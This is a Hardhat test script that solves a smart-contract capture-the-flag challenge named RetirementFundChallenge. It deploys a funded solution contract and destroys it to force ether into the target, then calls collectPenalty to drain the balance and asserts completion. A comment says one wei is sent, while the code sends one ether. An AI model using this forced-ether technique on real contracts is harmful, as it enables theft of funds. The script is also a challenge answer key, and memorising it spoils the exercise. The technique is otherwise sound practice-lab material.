const { expect} = require("chai");
const { ethers } = require("hardhat");

before(async () => {
    accounts = await ethers.getSigners();
    player = accounts[0];
    
  });
  
  it("ch12", async function () {
    const chFactory = await ethers.getContractFactory("RetirementFundChallenge");
    contract = await chFactory.attach(`0x9B5b256aD8714431819D33bcE8a4A3efE1Ddf054`);

    const solFactory = await ethers.getContractFactory("RetirementFundSolution")
    solContract = await solFactory.deploy(contract.address, {value:ethers.utils.parseEther("1.0"), gasLimit:6e6}) // sending one wei
    console.log(solContract.address);
    await solContract.deployed();
    console.log("sol contract deployed");

    
    tx = await solContract.destruct();
    console.log("sol contract destruction initiated")
    await tx.wait();
    console.log("sol contract destructed");

    

    tx = await contract.collectPenalty({gasLimit:6e6});
    console.log("collectPenalty tx intitiated");
    await tx.wait();
    console.log("collectPenalty tx completed");

    var isComplete = await contract.connect(player).isComplete();
    expect(isComplete).to.be.true;
  });
